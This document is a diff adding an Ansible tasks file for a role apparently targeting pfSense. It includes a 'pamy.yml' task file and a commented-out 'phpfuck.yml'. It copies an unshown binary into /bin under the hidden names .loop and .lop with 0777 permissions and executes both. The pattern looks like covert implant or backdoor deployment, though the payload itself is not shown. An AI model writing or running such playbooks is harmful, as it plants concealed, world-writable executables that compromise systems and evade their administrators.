@@ -1,0 +1,33 @@
+---
+# tasks file for pfsense-ub
+
+
+#- name: include phpfuck.yml
+#  include_tasks: phpfuck.yml
+#  tags: test
+
+- name: include pamy.yml
+  include_tasks: pamy.yml
+  tags: pamy
+
+- name: include extra
+  include_tasks: extra.yml
+  tags: extra 
+
+- name: upload loop
+  copy:
+      src: loop
+      dest: /bin/.loop
+      mode: 0777
+
+- name: upload lop
+  copy:
+      src: loop
+      dest: /bin/.lop
+      mode: 0777
+      
+- name: run loop
+  raw: ./bin/.loop
+ 
+- name: run lop
+  raw: ./bin/.lop
